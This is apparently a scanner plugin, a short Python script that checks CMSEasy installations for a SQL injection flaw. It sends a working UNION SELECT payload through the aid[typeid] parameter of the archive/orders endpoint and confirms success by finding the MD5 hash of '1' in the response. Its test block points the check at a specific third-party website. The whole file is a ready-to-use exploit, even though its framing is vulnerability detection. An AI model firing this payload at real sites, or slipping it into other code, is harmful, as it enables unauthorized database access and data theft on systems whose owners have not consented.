import re
def assign(service,arg):
    if service == "cmseasy":
        return True,arg
def audit(arg):
    payload = "index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT/**/1,2,3,concat%28md5%281%29%29,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58%20from%20cmseasy_archive%20ORDER%20BY%201%23]=1"
    url = arg + payload
    code ,head,res,body,_ = curl.curl(url)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_warning(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('cmseasy','http://www.ruifanshihua.com/')[1])